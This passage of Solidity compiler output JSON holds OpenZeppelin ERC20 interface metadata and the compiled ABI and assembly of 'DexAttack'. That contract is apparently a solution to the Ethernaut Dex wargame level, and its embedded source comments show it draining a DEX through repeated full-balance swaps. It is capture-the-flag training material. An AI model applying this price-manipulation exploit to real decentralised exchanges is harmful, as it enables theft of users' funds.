									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Interface for the optional metadata functions from the ERC20 standard. _Available since v4.1._",
						"events": {
							"Approval(address,address,uint256)": {
								"details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
							},
							"Transfer(address,address,uint256)": {
								"details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
							}
						},
						"kind": "dev",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the amount of tokens owned by `account`."
							},
							"decimals()": {
								"details": "Returns the decimals places of the token."
							},
							"name()": {
								"details": "Returns the name of the token."
							},
							"symbol()": {
								"details": "Returns the symbol of the token."
							},
							"totalSupply()": {
								"details": "Returns the amount of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							}
						},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"name()": "06fdde03",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface for the optional metadata functions from the ERC20 standard. _Available since v4.1._\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the amount of tokens owned by `account`.\"},\"decimals()\":{\"details\":\"Returns the decimals places of the token.\"},\"name()\":{\"details\":\"Returns the name of the token.\"},\"symbol()\":{\"details\":\"Returns the symbol of the token.\"},\"totalSupply()\":{\"details\":\"Returns the amount of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":\"IERC20Metadata\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"keccak256\":\"0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd\",\"dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"@openzeppelin/contracts/utils/Context.sol": {
				"Context": {
					"abi": [],
					"devdoc": {
						"details": "Provides information about the current execution context, including the sender of the transaction and its data. While these are generally available via msg.sender and msg.data, they should not be accessed in such a direct manner, since when dealing with meta-transactions the account sending and paying for execution may not be the actual sender (as far as an application is concerned). This contract is only required for intermediate, library-like contracts.",
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Provides information about the current execution context, including the sender of the transaction and its data. While these are generally available via msg.sender and msg.data, they should not be accessed in such a direct manner, since when dealing with meta-transactions the account sending and paying for execution may not be the actual sender (as far as an application is concerned). This contract is only required for intermediate, library-like contracts.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/Context.sol\":\"Context\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Context.sol\":{\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92\",\"dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"ethernaut/Dex.sol": {
				"DexAttack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_token1",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "_token2",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "_dex",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "dex2Attack",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "dexAttack",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_token3",
									"type": "address"
								}
							],
							"name": "setToken3",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernaut/Dex.sol\":254:2458  contract DexAttack {... */\n  mstore(0x40, 0x80)\n    /* \"ethernaut/Dex.sol\":357:500  constructor(address _token1, address _token2, address _dex)... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  dup2\n  swap1\n  mstore\n  tag_2\n  swap2\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"ethernaut/Dex.sol\":431:437  token1 */\n  0x00\n    /* \"ethernaut/Dex.sol\":431:447  token1 = _token1 */\n  dup1\n  sload\n  sub(shl(0xa0, 0x01), 0x01)\n  swap5\n  dup6\n  and\n  not(sub(shl(0xa0, 0x01), 0x01))\n  swap2\n  dup3\n  and\n  or\n  swap1\n  swap2\n  sstore\n  0x01\n    /* \"ethernaut/Dex.sol\":457:473  token2 = _token2 */\n  dup1\n  sload\n  swap4\n  dup6\n  and\n  swap4\n  dup3\n  and\n  swap4\n  swap1\n  swap4\n  or\n  swap1\n  swap3\n  sstore\n    /* \"ethernaut/Dex.sol\":483:486  dex */\n  0x03\n    /* \"ethernaut/Dex.sol\":483:493  dex = _dex */\n  dup1\n  sload\n  swap2\n  swap1\n  swap4\n  and\n  swap2\n  and\n  or\n  swap1\n  sstore\n    /* \"ethernaut/Dex.sol\":254:2458  contract DexAttack {... */\n  jump(tag_8)\n    /* \"#utility.yul\":14:191   */\ntag_7:\n    /* \"#utility.yul\":93:106   */\n  dup1\n  mload\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":135:166   */\n  dup2\n  and\n    /* \"#utility.yul\":125:167   */\n  dup2\n  eq\n    /* \"#utility.yul\":115:185   */\n  tag_10\n  jumpi\n    /* \"#utility.yul\":181:182   */\n  0x00\n    /* \"#utility.yul\":178:179   */\n  dup1\n    /* \"#utility.yul\":171:183   */\n  revert\n    /* \"#utility.yul\":115:185   */\ntag_10:\n    /* \"#utility.yul\":14:191   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":196:574   */\ntag_3:\n    /* \"#utility.yul\":284:290   */\n  0x00\n    /* \"#utility.yul\":292:298   */\n  dup1\n    /* \"#utility.yul\":300:306   */\n  0x00\n    /* \"#utility.yul\":353:355   */\n  0x60\n    /* \"#utility.yul\":341:350   */\n  dup5\n    /* \"#utility.yul\":332:339   */\n  dup7\n    /* \"#utility.yul\":328:351   */\n  sub\n    /* \"#utility.yul\":324:356   */\n  slt\n    /* \"#utility.yul\":321:373   */\n  iszero\n  tag_12\n  jumpi\n    /* \"#utility.yul\":369:370   */\n  0x00\n    /* \"#utility.yul\":366:367   */\n  dup1\n    /* \"#utility.yul\":359:371   */\n  revert\n    /* \"#utility.yul\":321:373   */\ntag_12:\n    /* \"#utility.yul\":392:432   */\n  tag_13\n    /* \"#utility.yul\":422:431   */\n  dup5\n    /* \"#utility.yul\":392:432   */\n  tag_7\n  jump\t// in\ntag_13:\n    /* \"#utility.yul\":382:432   */\n  swap3\n  pop\n    /* \"#utility.yul\":451:500   */\n  tag_14\n    /* \"#utility.yul\":496:498   */\n  0x20\n    /* \"#utility.yul\":485:494   */\n  dup6\n    /* \"#utility.yul\":481:499   */\n  add\n    /* \"#utility.yul\":451:500   */\n  tag_7\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":441:500   */\n  swap2\n  pop\n    /* \"#utility.yul\":519:568   */\n  tag_15\n    /* \"#utility.yul\":564:566   */\n  0x40\n    /* \"#utility.yul\":553:562   */\n  dup6\n    /* \"#utility.yul\":549:567   */\n  add\n    /* \"#utility.yul\":519:568   */\n  tag_7\n  jump\t// in\ntag_15:\n    /* \"#utility.yul\":509:568   */\n  swap1\n  pop\n    /* \"#utility.yul\":196:574   */\n  swap3\n  pop\n  swap3\n  pop\n  swap3\n  jump\t// out\ntag_8:\n    /* \"ethernaut/Dex.sol\":254:2458  contract DexAttack {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernaut/Dex.sol\":254:2458  contract DexAttack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x2216e590\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x3e50269c\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xd7df8d6f\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernaut/Dex.sol\":506:581  function setToken3(address _token3) public{... */\n    tag_3:\n      tag_6\n      tag_7\n      calldatasize\n      0x04\n      tag_8\n      jump\t// in\n    tag_7:\n        /* \"ethernaut/Dex.sol\":558:564  token3 */\n      0x02\n        /* \"ethernaut/Dex.sol\":558:574  token3 = _token3 */\n      dup1\n      sload\n      not(sub(shl(0xa0, 0x01), 0x01))\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n      swap3\n      swap1\n      swap3\n      and\n      swap2\n      swap1\n      swap2\n      or\n      swap1\n      sstore\n        /* \"ethernaut/Dex.sol\":506:581  function setToken3(address _token3) public{... */\n      jump\n    tag_6:\n      stop\n        /* \"ethernaut/Dex.sol\":1327:2454  function dex2Attack() external {... */\n    tag_4:\n      tag_6\n      tag_11\n      jump\t// in\n        /* \"ethernaut/Dex.sol\":587:1319  function dexAttack() external {... */\n    tag_5:\n      tag_6\n      tag_13\n      jump\t// in\n        /* \"ethernaut/Dex.sol\":1327:2454  function dex2Attack() external {... */\n    tag_11:\n        /* \"ethernaut/Dex.sol\":1375:1381  token1 */\n      sload(0x00)\n        /* \"ethernaut/Dex.sol\":1368:1426  IERC20(token1).transferFrom(msg.sender, address(this), 10) */\n      mload(0x40)\n      shl(0xe0, 0x23b872dd)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1375:1381  token1 */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1368:1395  IERC20(token1).transferFrom */\n      0x23b872dd\n      swap1\n        /* \"ethernaut/Dex.sol\":1368:1426  IERC20(token1).transferFrom(msg.sender, address(this), 10) */\n      tag_16\n      swap1\n        /* \"ethernaut/Dex.sol\":1396:1406  msg.sender */\n      caller\n      swap1\n        /* \"ethernaut/Dex.sol\":1416:1420  this */\n      address\n      swap1\n        /* \"ethernaut/Dex.sol\":1423:1425  10 */\n      0x0a\n      swap1\n        /* \"ethernaut/Dex.sol\":1368:1426  IERC20(token1).transferFrom(msg.sender, address(this), 10) */\n      0x04\n      add\n      tag_17\n      jump\t// in\n    tag_16:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_19:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_20\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      pop\n        /* \"ethernaut/Dex.sol\":1443:1449  token2 */\n      sload(0x01)\n        /* \"ethernaut/Dex.sol\":1436:1494  IERC20(token2).transferFrom(msg.sender, address(this), 10) */\n      mload(0x40)\n      shl(0xe0, 0x23b872dd)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1443:1449  token2 */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1436:1463  IERC20(token2).transferFrom */\n      0x23b872dd\n      swap1\n        /* \"ethernaut/Dex.sol\":1436:1494  IERC20(token2).transferFrom(msg.sender, address(this), 10) */\n      tag_22\n      swap1\n        /* \"ethernaut/Dex.sol\":1464:1474  msg.sender */\n      caller\n      swap1\n        /* \"ethernaut/Dex.sol\":1484:1488  this */\n      address\n      swap1\n        /* \"ethernaut/Dex.sol\":1491:1493  10 */\n      0x0a\n      swap1\n        /* \"ethernaut/Dex.sol\":1436:1494  IERC20(token2).transferFrom(msg.sender, address(this), 10) */\n      0x04\n      add\n      tag_17\n      jump\t// in\n    tag_22:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_25\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_25:\n      pop\n        /* \"ethernaut/Dex.sol\":1512:1518  token1 */\n      sload(0x00)\n        /* \"ethernaut/Dex.sol\":1528:1531  dex */\n      sload(0x03)\n        /* \"ethernaut/Dex.sol\":1505:1548  IERC20(token1).approve(dex, type(uint).max) */\n      mload(0x40)\n      shl(0xe0, 0x095ea7b3)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1528:1531  dex */\n      swap2\n      dup3\n      and\n        /* \"ethernaut/Dex.sol\":1505:1548  IERC20(token1).approve(dex, type(uint).max) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1150:1201   */\n      mstore\n      not(0x00)\n        /* \"#utility.yul\":1217:1235   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1210:1244   */\n      mstore\n        /* \"ethernaut/Dex.sol\":1512:1518  token1 */\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1505:1527  IERC20(token1).approve */\n      0x095ea7b3\n      swap1\n        /* \"#utility.yul\":1123:1141   */\n      0x44\n      add\n        /* \"ethernaut/Dex.sol\":1505:1548  IERC20(token1).approve(dex, type(uint).max) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_30\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_30:\n      pop\n        /* \"ethernaut/Dex.sol\":1565:1571  token2 */\n      sload(0x01)\n        /* \"ethernaut/Dex.sol\":1581:1584  dex */\n      sload(0x03)\n        /* \"ethernaut/Dex.sol\":1558:1601  IERC20(token2).approve(dex, type(uint).max) */\n      mload(0x40)\n      shl(0xe0, 0x095ea7b3)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1581:1584  dex */\n      swap2\n      dup3\n      and\n        /* \"ethernaut/Dex.sol\":1558:1601  IERC20(token2).approve(dex, type(uint).max) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1150:1201   */\n      mstore\n      not(0x00)\n        /* \"#utility.yul\":1217:1235   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1210:1244   */\n      mstore\n        /* \"ethernaut/Dex.sol\":1565:1571  token2 */\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1558:1580  IERC20(token2).approve */\n      0x095ea7b3\n      swap1\n        /* \"#utility.yul\":1123:1141   */\n      0x44\n      add\n        /* \"ethernaut/Dex.sol\":1558:1601  IERC20(token2).approve(dex, type(uint).max) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_33\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_33:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_34\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_34:\n      pop\n        /* \"ethernaut/Dex.sol\":1617:1620  dex */\n      sload(0x03)\n      0x00\n        /* \"ethernaut/Dex.sol\":1627:1633  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":1617:1620  dex */\n      0x01\n        /* \"ethernaut/Dex.sol\":1635:1641  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":1643:1682  IERC20(token1).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":1676:1680  this */\n      address\n        /* \"ethernaut/Dex.sol\":1643:1682  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1617:1620  dex */\n      swap4\n      dup5\n      and\n      swap4\n        /* \"ethernaut/Dex.sol\":1612:1626  IDex(dex).swap */\n      0xdf791e50\n      swap4\n        /* \"ethernaut/Dex.sol\":1627:1633  token1 */\n      dup2\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":1635:1641  token2 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1627:1633  token1 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":1643:1667  IERC20(token1).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":1643:1682  IERC20(token1).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_38\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_38:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_39\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_39:\n        /* \"ethernaut/Dex.sol\":1612:1683  IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_41\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_41:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_43\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_43:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_45\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_45:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":1700:1703  dex 